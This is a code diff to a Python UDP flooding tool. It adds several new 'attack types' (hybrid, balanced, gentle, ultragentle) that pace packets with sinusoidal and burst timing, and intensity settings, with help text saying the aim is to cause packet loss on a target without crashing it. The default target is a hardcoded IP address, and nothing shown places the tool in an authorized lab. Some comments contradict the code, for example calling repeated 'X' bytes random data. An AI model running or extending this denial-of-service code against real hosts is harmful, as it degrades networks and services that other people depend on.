@@ -7,6 +7,7 @@ from datetime import datetime
 import struct
 import argparse
 import os
+import math
 
 # Global variables for statistics
 packets_sent = 0
@@ -25,34 +26,48 @@ def send_packets(target_ip, target_port, packet_size, duration, attack_type="gra
     # Set socket options for better reliability
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     
-    # Use an even smaller packet size to avoid triggering errors
-    # Different packet sizes for different attack types
+    # Further reduce packet sizes - ONLY use TINY packets!
     if attack_type == "tiny":
-        actual_packet_size = 64  # Very small packets
+        actual_packet_size = 48  # Very small packets
     elif attack_type == "varied":
-        # Will vary dynamically
-        actual_packet_size = min(600, packet_size)
+        actual_packet_size = min(128, packet_size)
+    elif attack_type == "hybrid":
+        actual_packet_size = 64
+    elif attack_type == "balanced":
+        actual_packet_size = 96
+    elif attack_type == "gentle":  # New ultra-conservative mode
+        actual_packet_size = 64
+    elif attack_type == "ultragentle":  # New super-conservative mode
+        actual_packet_size = 48
     else:
-        # For other attack types
-        actual_packet_size = min(600, packet_size)
+        actual_packet_size = min(128, packet_size)
     
-    # Create different payload templates to avoid regenerating for every packet
+    # Create simpler payload templates - using very small packet sizes
     payload_templates = {}
-    sizes = [64, 128, 256, 512, 600]
+    sizes = [48, 64, 96, 128]  # Avoid larger sizes completely
     for size in sizes:
         try:
-            payload_templates[size] = os.urandom(size)  # More random than random.randbytes
+            # Create completely random data - no structure at all
+            payload_templates[size] = b'X' * size  # Even simpler payload - just repeated bytes
         except AttributeError:
-            payload_templates[size] = bytes(random.getrandbits(8) for _ in range(size))
-    
-    # Use the OS urandom for better randomness
-    base_payload = payload_templates[min(sizes, key=lambda k: abs(k-actual_packet_size))]
+            payload_templates[size] = bytes([88] * size)  # ASCII 'X' repeated
     
     end_time = time.time() + duration
     packet_count = 0
     
     # Parameters for different attack patterns
-    if attack_type == "gradual":
+    if attack_type == "ultragentle":  # Super-conservative mode
+        delay_range = (0.01, 0.05)  # Very slow rate
+        cycle_duration = 10.0  # seconds per cycle
+        phase = random.random() * cycle_duration
+        pauses_enabled = True
+    elif attack_type == "gentle":  
+        # Make gentle even gentler
+        delay_range = (0.008, 0.03)
+        cycle_duration = 8.0
+        phase = random.random() * cycle_duration
+        pauses_enabled = True
+    elif attack_type == "gradual":
         delay = 0.2  # Start with larger delay
         decrease_rate = 0.9995  # Very slow decrease
     elif attack_type == "pulse":
@@ -63,17 +78,29 @@ def send_packets(target_ip, target_port, packet_size, duration, attack_type="gra
         delay_range = (0.0005, 0.002)  # Fast tiny packets
     elif attack_type == "varied":
         delay_range = (0.002, 0.01)
+    elif attack_type == "balanced":
+        # New balanced mode - fluctuating bandwidth without crashing
+        delay_range = (0.001, 0.01)
+        cycle_duration = 5.0  # seconds per cycle
+        phase = random.random() * cycle_duration  # Random starting phase
+    elif attack_type == "hybrid":
+        # Hybrid uses varying delays to create network congestion without crashing
+        delay_range = (0.001, 0.01)  # Slightly slower than before
+        burst_count = 0
+        max_burst = random.randint(20, 50)  # Smaller bursts to avoid overwhelming
     else:  # random, constant or basic
         delay_range = (0.002, 0.02)
     
-    # Target ports - primary port plus nearby ports if multi-target is enabled
+    # Target ports - only use main port in gentle/ultragentle modes
     target_ports = [target_port]
-    if multi_target:
-        for offset in range(1, 4):  # Reduced range to avoid hitting too many ports
+    if multi_target and attack_type not in ["gentle", "ultragentle"]:
+        for offset in range(1, 2):  # Only target 1 port before and after
             target_ports.append(target_port + offset)
             target_ports.append(target_port - offset)
     
     # Main packet sending loop
+    burst_counter = 0
+    recovery_counter = 0
     while time.time() < end_time:
         try:
             # Implement different attack patterns
@@ -114,6 +141,103 @@ def send_packets(target_ip, target_port, packet_size, duration, attack_type="gra
                 time.sleep(random.uniform(*delay_range))
                 current_size = actual_packet_size
                 
+            elif attack_type == "balanced":
+                # New balanced mode - sinusoidal pattern to create bandwidth fluctuation
+                current_time = time.time()
+                cycle_pos = (current_time + phase) % cycle_duration / cycle_duration
+                
+                # Create sinusoidal delay pattern - alternating between fast and slow
+                delay_factor = 0.5 + 0.5 * math.sin(cycle_pos * 2 * math.pi)
+                min_delay, max_delay = delay_range
+                current_delay = min_delay + (max_delay - min_delay) * delay_factor
+                
+                time.sleep(current_delay)
+                
+                # Vary packet sizes but avoid extremes
+                if cycle_pos < 0.3:
+                    current_size = 128
+                elif cycle_pos < 0.7:
+                    current_size = 192
+                else:
+                    current_size = 256
+                
+            elif attack_type == "hybrid":
+                # Modified hybrid attack - more conservative to avoid crashing
+                burst_count += 1
+                
+                # Create patterns of burst and pause - shorter bursts
+                if burst_count < max_burst:
+                    # Burst phase - more moderate
+                    time.sleep(0.001)  # Less aggressive
+                    current_size = 128
+                else:
+                    # Pause phase - brief pause and then reset
+                    time.sleep(0.01)  # shorter pause
+                    burst_count = 0
+                    max_burst = random.randint(20, 50)
+                    current_size = 96
+                
+                # Less variation in size
+                if random.random() < 0.05:  # 5% chance
+                    current_size = random.choice([64, 192])
+                
+            elif attack_type == "gentle":
+                # Ultra-conservative pattern
+                current_time = time.time()
+                cycle_pos = (current_time + phase) % cycle_duration / cycle_duration
+                
+                # Use gentler sinusoidal pattern
+                delay_factor = 0.5 + 0.5 * math.sin(cycle_pos * 2 * math.pi)
+                min_delay, max_delay = delay_range
+                current_delay = min_delay + (max_delay - min_delay) * delay_factor
+                
+                # Occasionally add longer pauses to let the server recover
+                if random.random() < 0.01:  # 1% chance
+                    time.sleep(0.1)
+                else:
+                    time.sleep(current_delay)
+                
+                # Use 96-byte packets most of the time, only occasionally use larger ones
+                if cycle_pos < 0.8:
+                    current_size = 96
+                else:
+                    current_size = 128
+                
+                # Add burst limiting - pause after every 1000 packets
+                burst_counter += 1
+                if burst_counter >= 1000:
+                    time.sleep(0.1)  # Take a short break
+                    burst_counter = 0
+                
+            elif attack_type == "ultragentle":
+                # Super-conservative pattern with long pauses
+                current_time = time.time()
+                cycle_pos = (current_time + phase) % cycle_duration / cycle_duration
+                
+                # Vary delays significantly
+                if cycle_pos < 0.7:  # 70% of the time, send very slowly
+                    delay_factor = 0.6 + 0.4 * math.sin(cycle_pos * 2 * math.pi)
+                    min_delay, max_delay = delay_range
+                    current_delay = min_delay + (max_delay - min_delay) * delay_factor
+                    time.sleep(current_delay)
+                else:  # 30% of the time, pause completely
+                    time.sleep(0.2)  # Long pause
+                
+                # Use only tiny packets
+                current_size = 48
+                
+                # Add more frequent pauses
+                burst_counter += 1
+                if burst_counter >= 500:  # Pause after every 500 packets
+                    time.sleep(0.2)  # Longer break
+                    burst_counter = 0
+                
+                # Add occasional recovery periods
+                recovery_counter += 1
+                if recovery_counter >= 5000:  # Every 5000 packets, take a long break
+                    time.sleep(1.0)  # 1-second break to let server recover
+                    recovery_counter = 0
+                
             else:  # Random, constant, or basic
                 time.sleep(random.uniform(*delay_range))
                 current_size = actual_packet_size
@@ -121,20 +245,27 @@ def send_packets(target_ip, target_port, packet_size, duration, attack_type="gra
             # Generate extremely simple packet - just random data, no structure
             packet_count += 1
             
-            # Get the right size payload template
-            closest_size = min(sizes, key=lambda k: abs(k-current_size))
-            payload = payload_templates[closest_size]
+            # Get payload with simplified logic - avoid dynamic calculations
+            if current_size <= 48:
+                payload = payload_templates[48]
+            elif current_size <= 64:
+                payload = payload_templates[64]
+            elif current_size <= 96:
+                payload = payload_templates[96]
+            else:
+                payload = payload_templates[128]
             
             # Select a target port
             current_port = random.choice(target_ports) if multi_target else target_port
             
-            # Send packet
-            sock.sendto(payload, (target_ip, current_port))
-            
-            # Update statistics
-            with lock:
-                packets_sent += 1
-                bytes_sent += len(payload)
+            # Send packet with additional safeguards
+            if random.random() < 0.95:  # 5% chance of skipping packet to reduce load
+                sock.sendto(payload, (target_ip, current_port))
+                
+                # Update statistics
+                with lock:
+                    packets_sent += 1
+                    bytes_sent += len(payload)
                 
         except Exception:
             # Just ignore errors and continue
@@ -159,7 +290,7 @@ def flood(target_ip, target_port, duration=60, packet_size=600, num_threads=10,
     
     # Create and start threads with different attack patterns
     threads = []
-    attack_types = ["gradual", "pulse", "random", "slow", "tiny", "varied", "basic"]
+    attack_types = ["gradual", "pulse", "random", "slow", "tiny", "varied", "basic", "hybrid"]
     
     # Cap number of threads to avoid excessive load
     num_threads = min(num_threads, 20)  # Reduced maximum thread count
@@ -231,7 +362,7 @@ def flood(target_ip, target_port, duration=60, packet_size=600, num_threads=10,
     mbytes_sent = bytes_sent / (1024 * 1024)
     print(f"\n[*] Flooding completed.")
     print(f"[*] Sent {packets_sent} packets ({mbytes_sent:.2f} MB) in {elapsed_time:.2f} seconds")
-    print(f"[*] Average: {packets_sent / elapsed_time if elapsed_time > 0 else 0:.2f} pkt/s, {mbytes_sent*8/elapsed_time:.2f} Mbps")
+    print(f"[*] Average: {(packets_sent / elapsed_time if elapsed_time > 0 else 0):.2f} pkt/s, {(mbytes_sent*8/elapsed_time if elapsed_time > 0 else 0):.2f} Mbps")
 
 def main():
     # Create argument parser with safer default values
@@ -239,19 +370,29 @@ def main():
     parser.add_argument('-t', '--target', default="140.118.123.107", help='Target IP address')
     parser.add_argument('-p', '--port', type=int, default=5001, help='Target port')
     parser.add_argument('-d', '--duration', type=int, default=60, help='Test duration in seconds')
-    parser.add_argument('-s', '--size', type=int, default=600, help='Packet size in bytes (default: 600)')
-    parser.add_argument('-n', '--threads', type=int, default=10, help='Number of threads (default: 10)')
-    parser.add_argument('-a', '--attack-type', default="distributed", 
-                        choices=["distributed", "gradual", "pulse", "random", "slow", "tiny", "varied", "basic", "help"],
+    parser.add_argument('-s', '--size', type=int, default=64, help='Max packet size in bytes (default: 64)')
+    parser.add_argument('-n', '--threads', type=int, default=3, help='Number of threads (default: 3)')
+    parser.add_argument('-a', '--attack-type', default="ultragentle", 
+                        choices=["distributed", "gradual", "pulse", "random", "slow", 
+                                 "tiny", "varied", "basic", "hybrid", "balanced", 
+                                 "gentle", "ultragentle", "help"],
                         help='Traffic pattern to use')
     parser.add_argument('-m', '--multi-target', action='store_true', help='Also send to nearby ports')
     parser.add_argument('--stress-test', action='store_true', help='Run a stress test at lower intensity')
+    parser.add_argument('--intensity', type=int, default=1, choices=[1, 2, 3],
+                        help='Attack intensity (1=mild, 2=medium, 3=aggressive)')
+    parser.add_argument('--progressive', action='store_true', 
+                       help='Progressively increase intensity until packet loss is detected')
     
     args = parser.parse_args()
     
     if args.attack_type == "help":
         print("Available attack types:")
-        print("  distributed - Mix of all attack types across threads (default)")
+        print("  ultragentle - Super-conservative mode with tiny packets (default)")
+        print("  gentle      - Ultra-conservative mode to avoid crashes")
+        print("  balanced    - Uses wave patterns for stable packet loss")
+        print("  hybrid      - Balanced attack to cause packet loss")
+        print("  distributed - Mix of all attack types across threads")
         print("  gradual     - Gradually increase packet rate")
         print("  pulse       - Send packets in pulses (high/low intensity)")
         print("  random      - Random delays and packet sizes")
@@ -260,15 +401,28 @@ def main():
         print("  varied      - Continuously varying packet sizes")
         print("  basic       - Simple packets with no special formatting")
         print("\nAdditional options:")
+        print("  --intensity N     - Set attack intensity (1=mild, 2=medium, 3=aggressive)")
         print("  --multi-target    - Send to nearby ports as well")
         print("  --stress-test     - Run a less intense but longer test")
+        print("  --progressive     - Start with mild intensity and increase until packet loss is detected")
         sys.exit(0)
+    
+    # Even more conservative defaults
+    if args.intensity == 1:  # Mild
+        args.threads = min(args.threads, 2)
+        args.size = min(args.size, 64)
+    elif args.intensity == 2:  # Medium
+        args.threads = min(args.threads, 4) 
+        args.size = min(args.size, 96)
+    else:  # Aggressive
+        args.threads = min(args.threads, 8)
+        args.size = min(args.size, 128)
     
     # Adjust parameters for stress test
     if args.stress_test:
-        args.duration = max(args.duration, 120)  # Minimum 2 minutes
-        args.threads = min(args.threads, 5)      # Maximum 5 threads
-        args.size = min(args.size, 512)          # Maximum 512 bytes
+        args.duration = max(args.duration, 120)
+        args.threads = min(args.threads, 3)
+        args.size = min(args.size, 128)
     
     # Start flooding
     flood(args.target, args.port, args.duration, args.size, args.threads, args.attack_type, args.multi_target)
